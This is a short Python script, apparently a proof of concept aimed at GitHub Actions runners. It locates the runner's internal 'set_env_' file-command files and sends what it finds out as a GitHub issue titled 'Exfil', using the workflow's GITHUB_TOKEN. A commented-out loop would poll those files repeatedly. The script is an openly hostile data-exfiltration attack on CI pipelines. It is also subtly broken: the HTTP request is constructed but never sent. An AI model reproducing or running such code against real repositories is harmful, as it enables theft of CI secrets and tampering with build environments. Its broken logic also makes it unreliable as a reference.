#!/usr/bin/env python3
import os
import json
import time
import urllib.request

GITHUB_TOKEN = os.environ["GITHUB_TOKEN"]
GITHUB_REPOSITORY = os.environ["GITHUB_REPOSITORY"]
ENV_VARS_DIR = '/home/runner/work/_temp/_runner_file_commands/'
PREFIX = 'set_env_'

MONITORED_VARS = ["TARGET_VAR"]
POLL_INTERVAL = .2

def on_change(new_value):
    create_issue(f"Env var file is '{new_value}'")

def get_env_vars_file():
    return max(
        (f for f in os.listdir(ENV_VARS_DIR) if os.path.isfile(os.path.join(ENV_VARS_DIR, f)) and f.startswith(PREFIX)),
        key=lambda f: os.path.getmtime(os.path.join(ENV_VARS_DIR, f)),
        default=''
    )

def main():

    file = get_env_vars_file()
    create_issue(file)
    # previous_value = ''

    # while True:
    #     current_value = get_env_vars_file()
    #     print(current_value)
    #     if current_value != previous_value:
    #             on_change(current_value)
    #             previous_value = current_value
    #             print(f"Changed: {current_value}")
    #     time.sleep(POLL_INTERVAL)

def create_issue(exfil):
    title = "Exfil"
    body = exfil

    api_url = f"https://api.github.com/repos/{GITHUB_REPOSITORY}/issues"

    data = json.dumps({
        "title": title,
        "body": body
    }).encode("utf-8")

    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "Content-Type": "application/json"
    }

    urllib.request.Request(api_url, data=data, headers=headers, method="POST")

if __name__ == "__main__":
    main()